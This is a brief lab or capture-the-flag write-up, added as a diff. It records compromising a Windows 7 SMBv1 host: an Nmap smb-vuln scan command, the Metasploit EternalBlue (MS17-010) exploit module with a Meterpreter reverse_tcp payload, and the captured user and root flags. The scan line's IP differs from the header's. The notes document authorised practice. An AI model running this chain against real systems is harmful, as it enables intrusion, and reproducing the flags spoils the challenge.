@@ -1,0 +1,26 @@
+11/Nov/2022 - 10.10.10.40 (E)(W)
+
+Tools Used:
+Nmap, Metasploit, SearchSploit.
+
+Surface Level Vulnerabilities:
+139,445/tcp - SMBv1 (Remote Code Execution) (Tested : Root Shell)
+
+Finding SMB Version with Metasploit:
+auxiliary(scanner/smb/smb_version)
+
+Windows Version: Windows 7 Professional 7601 Service Pack 1
+
+Vulnerability Scan for SMB with Nmap:
+nmap --script smb-vuln* -p 139,445 10.10.10.4
+
+Exploits:
+MS17-010 (Tested : Root Shell)
+
+Meterpreter Shell with Metasploit:
+exploit(windows/smb/ms17_010_eternalblue)
+payload(windows/x64/meterpreter/reverse_tcp)
+
+User Flag: 7912c24900cdb51b6a49fc9fef50a120
+Root Flag: 24fb6c451c021c25d1d38dd4df9924f2
+
